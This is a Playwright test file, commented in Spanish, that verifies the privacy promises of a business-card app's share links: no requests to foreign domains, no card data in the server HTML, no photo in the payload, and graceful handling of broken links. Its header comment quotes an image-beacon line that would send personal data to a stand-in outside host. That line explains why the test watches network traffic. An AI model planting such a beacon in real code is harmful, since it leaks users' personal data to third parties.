import { expect, test } from '@playwright/test'
import { PERFILES } from './perfiles.datos'

/**
 * Unidad 6c del PRP-TD-001: **el link, medido desde afuera.**
 *
 * Este spec existe porque la promesa de privacidad del producto solo es cierta si se mide. Tres
 * cosas que ningun `grep` del codigo puede probar y aqui si:
 *
 * 1. Abrir un link con datos personales **no genera ni una peticion a un dominio ajeno**. Un
 *    `new Image().src = 'https://ajeno/?d=' + datos` exfiltraria por `img-src` sin tocar `fetch`,
 *    asi que la unica verificacion honesta es mirar la RED, no el codigo.
 * 2. El **HTML que sirve el servidor no contiene ningun dato de la tarjeta**. El payload viaja en el
 *    fragmento y el fragmento no se envia; esto lo comprueba en vez de creerselo.
 * 3. Un link roto o manipulado **no deja una pantalla en blanco**. Quien lo abre es un desconocido
 *    en su telefono, sin consola donde mirar.
 */

const PERFIL = PERFILES.find((p) => p.nombre === 'johann')!

/** Genera el enlace con el MISMO codigo que usa la app, desde el editor. */
async function generarEnlace(page: import('@playwright/test').Page, datos: unknown): Promise<string> {
  await page.goto('/editor')
  await page.evaluate((t) => {
    localStorage.clear()
    localStorage.setItem('tarjetica.tarjeta', JSON.stringify({ v: 1, d: t }))
    localStorage.setItem('tarjetica.confirmacion', JSON.stringify({ v: 1, d: true }))
  }, datos)
  await page.reload()

  await page.getByTestId('abrir-enlace').click()
  await expect(page.getByTestId('advertencia-enlace')).toBeVisible()
  await page.getByTestId('confirmar-enlace').click()
  await expect(page.getByTestId('enlace-generado')).toBeVisible()
  return (await page.getByTestId('enlace-generado').textContent())!.trim()
}

test.describe('la advertencia va ANTES de generar, no despues', () => {
  test('el enlace nace apagado: no existe hasta que se pide', async ({ page }) => {
    await page.goto('/editor')
    await page.evaluate((t) => {
      localStorage.clear()
      localStorage.setItem('tarjetica.tarjeta', JSON.stringify({ v: 1, d: t }))
      localStorage.setItem('tarjetica.confirmacion', JSON.stringify({ v: 1, d: true }))
    }, PERFIL.datos)
    await page.reload()
    await expect(page.getByTestId('enlace-generado')).toHaveCount(0)
    await expect(page.getByTestId('advertencia-enlace')).toHaveCount(0)
    await expect(page.getByTestId('abrir-enlace')).toBeVisible()
  })

  test('la advertencia dice las TRES cosas, y aparece antes del enlace', async ({ page }) => {
    await page.goto('/editor')
    await page.evaluate((t) => {
      localStorage.clear()
      localStorage.setItem('tarjetica.tarjeta', JSON.stringify({ v: 1, d: t }))
      localStorage.setItem('tarjetica.confirmacion', JSON.stringify({ v: 1, d: true }))
    }, PERFIL.datos)
    await page.reload()
    await page.getByTestId('abrir-enlace').click()

    const aviso = page.getByTestId('advertencia-enlace')
    await expect(aviso).toBeVisible()
    // Todavia no hay enlace: el aviso llega primero. Un aviso posterior no es advertencia.
    await expect(page.getByTestId('enlace-generado')).toHaveCount(0)

    const texto = (await aviso.textContent())!.toLowerCase()
    expect(texto, 'falta decir que es publico para quien lo tenga').toContain('cualquiera que lo tenga')
    expect(texto, 'falta decir que NO se puede desactivar').toContain('no se puede desactivar')
    expect(texto, 'falta decir lo del historial del navegador').toContain('historial del navegador')
  })

  test('"mejor no" lo deja como estaba, sin generar nada', async ({ page }) => {
    await page.goto('/editor')
    await page.evaluate((t) => {
      localStorage.clear()
      localStorage.setItem('tarjetica.tarjeta', JSON.stringify({ v: 1, d: t }))
      localStorage.setItem('tarjetica.confirmacion', JSON.stringify({ v: 1, d: true }))
    }, PERFIL.datos)
    await page.reload()
    await page.getByTestId('abrir-enlace').click()
    await page.getByTestId('cancelar-enlace').click()
    await expect(page.getByTestId('advertencia-enlace')).toHaveCount(0)
    await expect(page.getByTestId('enlace-generado')).toHaveCount(0)
  })

  test('sin confirmar que la tarjeta es tuya, no se puede pedir el enlace', async ({ page }) => {
    await page.goto('/editor')
    await page.evaluate((t) => {
      localStorage.clear()
      localStorage.setItem('tarjetica.tarjeta', JSON.stringify({ v: 1, d: t }))
    }, PERFIL.datos)
    await page.reload()
    await expect(page.getByTestId('abrir-enlace')).toBeDisabled()
  })
})

test.describe('el enlace lleva la tarjeta y NO la fuga', () => {
  test('un link generado se abre y muestra la tarjeta completa', async ({ page }) => {
    const enlace = await generarEnlace(page, PERFIL.datos)
    expect(enlace).toContain('/t#')
    // El payload va DESPUES del `#`. Si esto alguna vez pasa a `?`, los datos personales empiezan a
    // aparecer en los logs del hosting.
    expect(enlace).not.toContain('?')

    await page.goto(enlace)
    await expect(page.getByRole('heading', { level: 1 })).toHaveText('Johann Valderrama')
    await expect(page.getByTestId('qr-contacto')).toBeVisible()
  })

  test('el HTML del servidor no contiene ningun dato de la tarjeta', async ({ page, request }) => {
    const enlace = await generarEnlace(page, PERFIL.datos)
    const fragmento = enlace.split('#')[1]

    // Se pide la ruta PELADA, que es lo unico que el servidor llega a ver.
    const html = await (await request.get('/t')).text()
    for (const dato of ['Johann', 'Valderrama', 'Zelandia', '319 248 0121']) {
      expect(html, `el HTML del servidor trae "${dato}"`).not.toContain(dato)
    }
    expect(html, 'el HTML del servidor trae el payload').not.toContain(fragmento)
  })

  test('abrir un link con datos NO dispara ninguna peticion a un dominio ajeno', async ({ page }) => {
    const enlace = await generarEnlace(page, PERFIL.datos)

    const ajenas: string[] = []
    page.on('request', (r) => {
      const url = r.url()
      if (!url.startsWith('http://localhost:3210') && !url.startsWith('data:') && !url.startsWith('blob:')) {
        ajenas.push(url)
      }
    })

    await page.goto(enlace)
    await expect(page.getByTestId('qr-contacto')).toBeVisible()
    expect(ajenas, `recursos de fuera: ${ajenas.join(', ')}`).toEqual([])
  })

  test('el payload del enlace NO contiene la foto, ni con una foto cargada (G5)', async ({ page }) => {
    // Se comprueba sobre el payload REAL, no leyendo el codigo. Es la invariante que hace que el QR
    // del link siga siendo escaneable.
    await page.goto('/editor')
    await page.evaluate((t) => {
      localStorage.clear()
      localStorage.setItem('tarjetica.tarjeta', JSON.stringify({ v: 1, d: t }))
      localStorage.setItem('tarjetica.confirmacion', JSON.stringify({ v: 1, d: true }))
      // Una foto de verdad guardada, del tamaño que deja la unidad 2e.
      localStorage.setItem(
        'tarjetica.foto',
        JSON.stringify({ v: 1, d: { dataUrl: `data:image/jpeg;base64,${'A'.repeat(2000)}` } }),
      )
    }, PERFIL.datos)
    await page.reload()

    await page.getByTestId('abrir-enlace').click()
    await page.getByTestId('confirmar-enlace').click()
    const enlace = (await page.getByTestId('enlace-generado').textContent())!.trim()

    expect(enlace).not.toContain('data:image')
    expect(enlace).not.toContain('AAAAAAAA')
    // Y al abrirlo, la tarjeta sale con monograma, no con la foto: la invariante funcionando.
    await page.goto(enlace)
    await expect(page.getByTestId('monograma-vista')).toBeVisible()
  })
})

test.describe('un link roto no deja al desconocido mirando una pantalla en blanco', () => {
  for (const [nombre, fragmento] of [
    ['sin fragmento', ''],
    ['basura', '#!!!!!'],
    ['payload cortado', '#AQIDBAUG'],
  ] as const) {
    test(`${nombre}: sale un mensaje, no una pantalla vacia`, async ({ page }) => {
      await page.goto(`/t${fragmento}`)
      await expect(page.getByTestId('aviso-enlace')).toBeVisible()
      const texto = (await page.getByTestId('aviso-enlace').textContent())!
      expect(texto.length).toBeGreaterThan(20)
    })
  }
})
